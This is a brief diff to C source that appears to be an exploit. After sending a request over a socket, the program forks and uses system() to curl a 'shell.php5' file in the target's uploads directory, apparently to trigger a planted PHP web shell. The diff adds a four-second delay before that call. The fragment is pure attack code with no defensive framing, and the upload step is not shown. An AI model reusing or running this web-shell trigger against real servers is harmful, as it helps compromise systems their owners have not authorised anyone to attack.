@@ -288,6 +288,7 @@ send(sockhndl, request, strlen(request), 0);
 close(sockhndl);
 
 if (fork() == 0) {
+	sleep(4);
     char curl_cmd[256];
     snprintf(curl_cmd, sizeof(curl_cmd), "curl -s http://%s/uploads/shell.php5 >/dev/null 2>&1 &", target_ip);
     system(curl_cmd);
